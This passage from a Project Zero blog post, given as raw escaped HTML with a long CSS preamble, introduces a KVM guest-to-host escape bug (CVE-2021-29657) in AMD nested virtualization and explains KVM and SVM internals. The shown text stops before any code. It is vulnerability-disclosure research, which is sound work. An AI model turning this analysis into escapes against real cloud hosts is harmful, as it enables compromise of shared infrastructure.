"}.lst-kix_h05x1pycvl0d-3&gt;li:before{content:"-  "}.lst-kix_5qxqo8l30oy3-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_dvq5vbolwb6x-0{list-style-type:none}ol.lst-kix_69oxjbhu0l4-8.start{counter-reset:lst-ctn-kix_69oxjbhu0l4-8 0}.lst-kix_44h6gatzfsnw-2&gt;li:before{content:"" counter(lst-ctn-kix_44h6gatzfsnw-2,lower-roman) ". "}.lst-kix_44h6gatzfsnw-4&gt;li:before{content:"" counter(lst-ctn-kix_44h6gatzfsnw-4,lower-latin) ". "}ul.lst-kix_dvq5vbolwb6x-4{list-style-type:none}.lst-kix_xko68zpk7do4-4&gt;li{counter-increment:lst-ctn-kix_xko68zpk7do4-4}ul.lst-kix_dvq5vbolwb6x-3{list-style-type:none}.lst-kix_5qxqo8l30oy3-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_dvq5vbolwb6x-2{list-style-type:none}.lst-kix_44h6gatzfsnw-1&gt;li:before{content:"" counter(lst-ctn-kix_44h6gatzfsnw-1,lower-latin) ". "}.lst-kix_44h6gatzfsnw-5&gt;li:before{content:"" counter(lst-ctn-kix_44h6gatzfsnw-5,lower-roman) ". "}ul.lst-kix_dvq5vbolwb6x-1{list-style-type:none}ul.lst-kix_6q7katqp5wyr-8{list-style-type:none}ul.lst-kix_6q7katqp5wyr-7{list-style-type:none}ul.lst-kix_6q7katqp5wyr-6{list-style-type:none}ul.lst-kix_6q7katqp5wyr-5{list-style-type:none}.lst-kix_5qxqo8l30oy3-1&gt;li:before{content:"\0025cb  "}.lst-kix_5qxqo8l30oy3-0&gt;li:before{content:"\0025cf  "}.lst-kix_5qxqo8l30oy3-8&gt;li:before{content:"\0025a0  "}.lst-kix_44h6gatzfsnw-3&gt;li:before{content:"" counter(lst-ctn-kix_44h6gatzfsnw-3,decimal) ". "}ol.lst-kix_xko68zpk7do4-8.start{counter-reset:lst-ctn-kix_xko68zpk7do4-8 0}.lst-kix_5qxqo8l30oy3-2&gt;li:before{content:"\0025a0  "}.lst-kix_5qxqo8l30oy3-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_dvq5vbolwb6x-8{list-style-type:none}ul.lst-kix_dvq5vbolwb6x-7{list-style-type:none}ul.lst-kix_dvq5vbolwb6x-6{list-style-type:none}.lst-kix_44h6gatzfsnw-0&gt;li:before{content:"" counter(lst-ctn-kix_44h6gatzfsnw-0,decimal) ". "}ul.lst-kix_dvq5vbolwb6x-5{list-style-type:none}.lst-kix_5qxqo8l30oy3-5&gt;li:before{content:"\0025a0  "}.lst-kix_5qxqo8l30oy3-4&gt;li:before{content:"\0025cb  "}.lst-kix_69oxjbhu0l4-5&gt;li{counter-increment:lst-ctn-kix_69oxjbhu0l4-5}ol.lst-kix_69oxjbhu0l4-2.start{counter-reset:lst-ctn-kix_69oxjbhu0l4-2 0}.lst-kix_dvq5vbolwb6x-3&gt;li:before{content:"\0025cf  "}.lst-kix_dvq5vbolwb6x-2&gt;li:before{content:"\0025a0  "}.lst-kix_dvq5vbolwb6x-1&gt;li:before{content:"\0025cb  "}ol.lst-kix_xko68zpk7do4-6{list-style-type:none}ol.lst-kix_xko68zpk7do4-7{list-style-type:none}.lst-kix_xko68zpk7do4-7&gt;li:before{content:"" counter(lst-ctn-kix_xko68zpk7do4-7,lower-latin) ". "}ol.lst-kix_xko68zpk7do4-8{list-style-type:none}.lst-kix_dvq5vbolwb6x-0&gt;li:before{content:"\0025cf  "}.lst-kix_xko68zpk7do4-8&gt;li:before{content:"" counter(lst-ctn-kix_xko68zpk7do4-8,lower-roman) ". "}.lst-kix_44h6gatzfsnw-5&gt;li{counter-increment:lst-ctn-kix_44h6gatzfsnw-5}ol.lst-kix_xko68zpk7do4-0{list-style-type:none}ol.lst-kix_xko68zpk7do4-1{list-style-type:none}ol.lst-kix_xko68zpk7do4-2{list-style-type:none}ol.lst-kix_xko68zpk7do4-3{list-style-type:none}ol.lst-kix_xko68zpk7do4-4{list-style-type:none}ol.lst-kix_xko68zpk7do4-2.start{counter-reset:lst-ctn-kix_xko68zpk7do4-2 0}ol.lst-kix_xko68zpk7do4-5{list-style-type:none}.lst-kix_6q7katqp5wyr-7&gt;li:before{content:"\0025cb  "}.lst-kix_xko68zpk7do4-1&gt;li{counter-increment:lst-ctn-kix_xko68zpk7do4-1}.lst-kix_6q7katqp5wyr-3&gt;li:before{content:"\0025cf  "}.lst-kix_6q7katqp5wyr-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_fc4hxeeodeag-1{list-style-type:none}ul.lst-kix_fc4hxeeodeag-0{list-style-type:none}ul.lst-kix_fc4hxeeodeag-3{list-style-type:none}ul.lst-kix_fc4hxeeodeag-2{list-style-type:none}ul.lst-kix_fc4hxeeodeag-5{list-style-type:none}ul.lst-kix_fc4hxeeodeag-4{list-style-type:none}ul.lst-kix_fc4hxeeodeag-7{list-style-type:none}.lst-kix_44h6gatzfsnw-0&gt;li{counter-increment:lst-ctn-kix_44h6gatzfsnw-0}ul.lst-kix_fc4hxeeodeag-6{list-style-type:none}ul.lst-kix_fc4hxeeodeag-8{list-style-type:none}ol.lst-kix_44h6gatzfsnw-6.start{counter-reset:lst-ctn-kix_44h6gatzfsnw-6 0}.lst-kix_6q7katqp5wyr-5&gt;li:before{content:"\0025a0  "}.lst-kix_dvq5vbolwb6x-5&gt;li:before{content:"\0025a0  "}.lst-kix_44h6gatzfsnw-1&gt;li{counter-increment:lst-ctn-kix_44h6gatzfsnw-1}ol.lst-kix_69oxjbhu0l4-7.start{counter-reset:lst-ctn-kix_69oxjbhu0l4-7 0}ul.lst-kix_z3dz91t3nune-0{list-style-type:none}ul.lst-kix_z3dz91t3nune-2{list-style-type:none}ul.lst-kix_z3dz91t3nune-1{list-style-type:none}ul.lst-kix_z3dz91t3nune-4{list-style-type:none}.lst-kix_dvq5vbolwb6x-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_z3dz91t3nune-3{list-style-type:none}ul.lst-kix_z3dz91t3nune-6{list-style-type:none}ul.lst-kix_z3dz91t3nune-5{list-style-type:none}ul.lst-kix_z3dz91t3nune-8{list-style-type:none}ul.lst-kix_z3dz91t3nune-7{list-style-type:none}.lst-kix_rg61eog4va0o-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_xko68zpk7do4-4.start{counter-reset:lst-ctn-kix_xko68zpk7do4-4 0}ul.lst-kix_yq73i8vx5c3y-8{list-style-type:none}ol.lst-kix_69oxjbhu0l4-4.start{counter-reset:lst-ctn-kix_69oxjbhu0l4-4 0}ol.lst-kix_xko68zpk7do4-7.start{counter-reset:lst-ctn-kix_xko68zpk7do4-7 0}.lst-kix_69oxjbhu0l4-3&gt;li{counter-increment:lst-ctn-kix_69oxjbhu0l4-3}.lst-kix_p3qtgxnpnwqf-1&gt;li:before{content:"\0025cb  "}.lst-kix_vu6o8yw128np-1&gt;li:before{content:"-  "}ol.lst-kix_xko68zpk7do4-5.start{counter-reset:lst-ctn-kix_xko68zpk7do4-5 0}.lst-kix_z3dz91t3nune-2&gt;li:before{content:"\0025a0  "}ol.lst-kix_44h6gatzfsnw-8.start{counter-reset:lst-ctn-kix_44h6gatzfsnw-8 0}.lst-kix_p3qtgxnpnwqf-3&gt;li:before{content:"\0025cf  "}.lst-kix_fc4hxeeodeag-8&gt;li:before{content:"\0025a0  "}.lst-kix_z3dz91t3nune-0&gt;li:before{content:"\0025cf  "}.lst-kix_z3dz91t3nune-4&gt;li:before{content:"\0025cb  "}.lst-kix_vu6o8yw128np-5&gt;li:before{content:"-  "}.lst-kix_69oxjbhu0l4-4&gt;li{counter-increment:lst-ctn-kix_69oxjbhu0l4-4}.lst-kix_vu6o8yw128np-7&gt;li:before{content:"-  "}.lst-kix_rg61eog4va0o-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_9lp8uyya2hbd-8{list-style-type:none}.lst-kix_rg61eog4va0o-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_9lp8uyya2hbd-6{list-style-type:none}ul.lst-kix_9lp8uyya2hbd-7{list-style-type:none}.lst-kix_p3qtgxnpnwqf-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_9lp8uyya2hbd-4{list-style-type:none}ul.lst-kix_9lp8uyya2hbd-5{list-style-type:none}ul.lst-kix_9lp8uyya2hbd-2{list-style-type:none}.lst-kix_fc4hxeeodeag-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_9lp8uyya2hbd-3{list-style-type:none}.lst-kix_p3qtgxnpnwqf-5&gt;li:before{content:"\0025a0  "}.lst-kix_rg61eog4va0o-6&gt;li:before{content:"\0025cf  "}.lst-kix_44h6gatzfsnw-7&gt;li{counter-increment:lst-ctn-kix_44h6gatzfsnw-7}.lst-kix_vu6o8yw128np-3&gt;li:before{content:"-  "}.lst-kix_rg61eog4va0o-4&gt;li:before{content:"\0025cb  "}.lst-kix_qmksthfuerg1-5&gt;li:before{content:"\0025a0  "}.lst-kix_yq73i8vx5c3y-0&gt;li:before{content:"-  "}ul.lst-kix_9lp8uyya2hbd-0{list-style-type:none}.lst-kix_qmksthfuerg1-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_9lp8uyya2hbd-1{list-style-type:none}ol.lst-kix_69oxjbhu0l4-5.start{counter-reset:lst-ctn-kix_69oxjbhu0l4-5 0}.lst-kix_qmksthfuerg1-7&gt;li:before{content:"\0025cb  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_fc4hxeeodeag-2&gt;li:before{content:"\0025a0  "}.lst-kix_xko68zpk7do4-2&gt;li{counter-increment:lst-ctn-kix_xko68zpk7do4-2}.lst-kix_xko68zpk7do4-8&gt;li{counter-increment:lst-ctn-kix_xko68zpk7do4-8}.lst-kix_z3dz91t3nune-8&gt;li:before{content:"\0025a0  "}.lst-kix_fc4hxeeodeag-4&gt;li:before{content:"\0025cb  "}.lst-kix_yq73i8vx5c3y-4&gt;li:before{content:"-  "}.lst-kix_z3dz91t3nune-6&gt;li:before{content:"\0025cf  "}.lst-kix_qmksthfuerg1-3&gt;li:before{content:"\0025cf  "}.lst-kix_fc4hxeeodeag-6&gt;li:before{content:"\0025cf  "}.lst-kix_yq73i8vx5c3y-2&gt;li:before{content:"-  "}ol{margin:0;padding:0}table td,table th{padding:0}.c17{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.c32{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c4{margin-left:36pt;padding-top:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c8{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c21{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,"Courier New";font-style:normal}.c14{margin-left:36pt;padding-top:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c20{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.c1{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.c0{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.c3{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.c24{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c27{color:#000000;font-weight:400;font-size:11pt;font-family:Consolas,"Courier New"}.c10{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.c38{color:#000000;font-weight:400;font-size:10pt;font-family:"Roboto"}.c16{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c30{border-spacing:0;border-collapse:collapse;margin-right:auto}.c22{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.c29{color:#000000;font-weight:400;font-size:10pt;font-family:"Arial"}.c23{font-size:10pt;font-family:Consolas,"Courier New";font-weight:400}.c31{background-color:#fafafa;font-size:10.5pt;font-family:"Roboto"}.c25{text-decoration:none;vertical-align:baseline;font-style:normal}.c37{font-size:10pt;font-family:Consolas,"Courier New";color:#616161}.c36{color:#9c27b0;font-size:10pt;font-family:Consolas,"Courier New"}.c15{font-family:Consolas,"Courier New";color:#0d904f;font-weight:400}.c9{orphans:2;widows:2;height:11pt}.c13{orphans:2;widows:2}.c7{color:inherit;text-decoration:inherit}.c12{padding:0;margin:0}.c33{max-width:468pt;padding:72pt 72pt 72pt 72pt}.c35{margin-left:36pt}.c28{height:0pt}.c34{color:#0f9d58}.c19{height:1030.1pt}.c6{background-color:#ffffff}.c26{font-style:italic}.c11{height:11pt}.c18{font-weight:700}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c6 c33"&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;Posted by Felix Wilhelm, Project Zero&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c20 c13" id="h.atcddzti5hh2"&gt;&lt;span class="c21"&gt;Introduction&lt;/span&gt;&lt;/h2&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;KVM (for Kernel-based Virtual Machine) is the de-facto standard hypervisor for Linux-based cloud environments. Outside of Azure, almost all large-scale cloud and hosting providers are running on top of KVM, turning it into one of the fundamental security boundaries in the cloud. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;In this blog post I describe a &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2177&amp;q=owner%3Afwilhelm%40google.com&amp;can=1"&gt;vulnerability&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in KVM&amp;rsquo;s AMD-specific code and discuss how this bug can be turned into a full virtual machine escape. &lt;/span&gt;&lt;span class="c18"&gt;To the best of my knowledge, this is the first public writeup of a KVM guest-to-host breakout that does not rely on bugs in user space components such as QEMU. The discussed bug was assigned CVE-2021-29657, affects kernel versions &lt;/span&gt;&lt;span class="c18 c31"&gt;v5.10-rc1 to v5.12-rc6&lt;/span&gt;&lt;span class="c18"&gt;&amp;nbsp;and was patched at the end of &lt;/span&gt;&lt;span class="c16 c18"&gt;&lt;a class="c71" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a58d9166a756a0f4a6618e4f593232593d6df134"&gt;March&lt;/a&gt;&lt;/span&gt;&lt;span class="c18"&gt;&amp;nbsp;2021&lt;/span&gt;&lt;span class="c18"&gt;.&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;As the bug only became exploitable in v5.10 and was discovered roughly 5 months later, most real world deployments of KVM should not be affected. I still think the issue is an interesting case study in the work required to build a stable guest-to-host escape against KVM and hope that this writeup can strengthen the case that hypervisor compromises are not only theoretical issues. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;I start with a short overview of KVM&amp;rsquo;s architecture, before diving into the bug and its exploitation.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c20 c13" id="h.t0ejvkqgm647"&gt;&lt;span class="c21"&gt;KVM&lt;/span&gt;&lt;/h2&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;KVM is a Linux based open source hypervisor supporting hardware accelerated virtualization on x86, ARM, PowerPC and S/390. In contrast to the other big open source hypervisor Xen, KVM is deeply integrated with the Linux Kernel and builds on its scheduling, memory management and hardware integrations to provide efficient virtualization.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;KVM is implemented as one or more kernel modules (kvm.ko plus kvm-intel.ko or kvm-amd.ko on x86) that expose a low-level IOCTL-based &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://www.kernel.org/doc/html/latest/virt/kvm/api.html"&gt;API&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to user space processes over the /dev/kvm device. Using this API, a user space process (often called VMM for Virtual Machine Manager) can create new VMs, assign vCPUs and memory, and intercept memory or IO accesses to provide access to &lt;/span&gt;&lt;span&gt;emulate&lt;/span&gt;&lt;span&gt;d or virtualization-aware hardware devices. &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://www.qemu.org/"&gt;QEMU&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;has been the standard user space choice for KVM-based virtualization for a long time, but in the last few years alternatives like &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://github.com/lkvm/lkvm"&gt;LKVM&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://chromium.googlesource.com/chromiumos/platform/crosvm/"&gt;crosvm&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://github.com/firecracker-microvm/firecracker"&gt;Firecracker&lt;/a&gt;&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;have started to become popular. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;While KVM&amp;rsquo;s reliance on a separate user space component might seem complicated at first, it has a very nice benefit: Each VM running on a KVM host has a 1:1 mapping to a Linux process, making it managable using standard Linux tools. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;This means for example, that a guest&amp;#39;s memory can be inspected by dumping the allocated memory of its user space process or that resource limits for CPU time and memory can be applied easily. Additionally, KVM can offload most work related to device emulation to the userspace component. Outside of a couple of performance-sensitive devices related to interrupt handling, all of the complex low-level code for providing virtual disk, network or GPU access can be implemented in userspace. &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;When looking at public writeups of KVM-related vulnerabilities and exploits it becomes clear that this design was a wise decision. The large majority of disclosed vulnerabilities and all publicly available exploits affect QEMU and its support for emulated/paravirtualized devices. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;Even though KVM&amp;rsquo;s kernel attack surface is significantly smaller than the one exposed by a default QEMU configuration or similar user space VMMs, a KVM vulnerability has advantages that make it very valuable for an attacker: &lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c12 lst-kix_vu6o8yw128np-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Whereas user space VMMs can be sandboxed to reduce the impact of a VM breakout, no such option is available for KVM itself. Once an attacker is able to achieve code execution (or similarly powerful primitives like write access to page tables) in the context of the host kernel, the system is fully compromised. &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Due to the somewhat poor security history of QEMU, new user space VMMs like crosvm or Firecracker are written in Rust, a memory safe language. Of course, there can still be non-memory safety vulnerabilities or problems due to incorrect or buggy usage of the KVM APIs, but using Rust effectively prevents the large majority of bugs that were discovered in C-based user space VMMs in the past. &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Finally, a pure KVM exploit can work against targets that use proprietary or heavily modified user space VMMs. While the big cloud providers do not go into much detail about their virtualization stacks publicly, it is safe to assume that they do not depend on an unmodified QEMU version for their production workloads. In contrast, KVM&amp;rsquo;s smaller code base makes heavy modifications unlikely (and KVM&amp;rsquo;s contributor list points at a strong tendency to upstream such modifications when they exist). &amp;nbsp;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c5 c9 c35"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9 c35"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;With these advantages in mind, I decided to spend some time hunting for a KVM vulnerability that could be turned into a guest-to-host escape. In the past, I had &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://bugs.chromium.org/p/project-zero/issues/list?q=vmx%20owner%3Afwilhelm&amp;can=1"&gt;some success&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with finding vulnerabilities in KVM&amp;rsquo;s support for nested virtualization on Intel CPUs so reviewing the same functionality for AMD seemed like a good starting point. This is even more true,&lt;/span&gt;&lt;span&gt;&amp;nbsp;because the recent increase of AMD&amp;rsquo;s market share in the server segment means that KVM&amp;rsquo;s AMD implementation is suddenly becoming a more interesting target than it was in the last years.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Nested virtualization, the ability for a VM (called L1) to spawn nested guests (L2), was also a niche feature for a long time. However, due to hardware improvements that reduce its overhead and increasing customer demand it&amp;rsquo;s becoming more widely available. For example, Microsoft is heavily pushing for &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs"&gt;Virtualization-based Security&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;as part of newer Windows versions, requiring nested virtualization to support cloud-hosted Windows installations. KVM enables support for nested virtualization on both AMD&lt;/span&gt;&lt;span&gt;&amp;nbsp;and&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;Intel by default, so if an administrator or the user space VMM does not explicitly disable it, it&amp;rsquo;s part of the attack surface for a malicious or compromised VM.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;AMD&amp;rsquo;s virtualization extension is called SVM (for Secure Virtual Machine) and in order to support nested virtualization, the host hypervisor needs to intercept all SVM instructions that are executed by its guests, emulate their behavior and keep its state in sync with the underlying hardware. As you might imagine, implementing this correctly is quite difficult with a large potential for complex logic flaws, making it a perfect target for manual code review.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c20 c13" id="h.edb97hffqtq9"&gt;&lt;span class="c21"&gt;The Bug&lt;/span&gt;&lt;/h2&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Before diving into the KVM codebase and the bug I discovered, I want to quickly introduce how AMD SVM works to make the rest of the post easier to understand. (For a thorough documentation see &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://www.amd.com/system/files/TechDocs/24593.pdf"&gt;AMD64 Architecture Programmer&amp;rsquo;s Manual, Volume 2: System Programming Chapter 15&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.) SVM adds support for 6 new instructions to x86-64 if SVM support is enabled by setting the SVME bit in the EFER MSR. The most interesting of these instructions is &lt;/span&gt;&lt;span class="c26"&gt;VMRUN&lt;/span&gt;&lt;span&gt;, which (as its name suggests) is responsible for running a guest VM. &lt;/span&gt;&lt;span class="c26"&gt;VMRUN &lt;/span&gt;&lt;span class="c8"&gt;takes an implicit parameter via the RAX register pointing to the page-aligned physical address of a data structure called &amp;ldquo;virtual machine control block&amp;rdquo; (VMCB), which describes the state and configuration of the VM. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;The VMCB is split into two parts: First, the State Save area, which stores the values of all guest registers, including segment and control registers. Second, the Control area which describes the configuration of the VM. The Control area describes the virtualization features enabled for a VM, &amp;nbsp;sets which VM actions are intercepted to trigger a VM exit &lt;/span&gt;&lt;span&gt;and&lt;/span&gt;&lt;span&gt;&amp;nbsp;stores some fundamental configuration values such as the page table address used for &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://en.wikipedia.org/wiki/Second_Level_Address_Translation"&gt;nested paging&lt;/a&gt;&lt;/span&gt;&lt;span class="c8"&gt;. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;If the VMCB is correctly prepared (and we are not already running in a VM), VMRUN will first save the host state in a memory region called the host save area, whose address is configured by writing a physical address to the VM_HSAVE_PA MSR. Once the host state is saved, the CPU switches to the VM context and VMRUN only returns once a VM exit is triggered for one reason or another. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;An interesting aspect of SVM is that a lot of the state recovery after a VM exit has to be done by the hypervisor. Once a VM exit occurs, only RIP, RSP and RAX are restored to the previous host values and all other general purpose registers still contain the guest values. In addition, a full context switch requires manual execution of the VMSAVE/VMLOAD instructions which save/load additional system registers (FS, SS, LDTR, STAR, LSTAR &amp;hellip;) from memory.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;For nested virtualization to work, KVM intercepts execution of the VMRUN instruction and creates its own VMCB based on the VMCB the L1 guest prepared (called vmcb12 in KVM terminology). Of course, KVM can&amp;rsquo;t trust the guest provided vmcb12 and needs to carefully validate all fields that end up in the real VMCB that gets passed to the hardware (known as vmcb02).&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Most of the KVM&amp;rsquo;s code for nested virtualization on AMD is implemented in &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/kvm/svm/nested.c?h=v5.11"&gt;arch/x86/kvm/svm/nested.c&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the code that intercepts VMRUN instructions of nested guests is implemented in &lt;/span&gt;&lt;span class="c15"&gt;nested_svm_vmrun&lt;/span&gt;&lt;span class="c8"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a 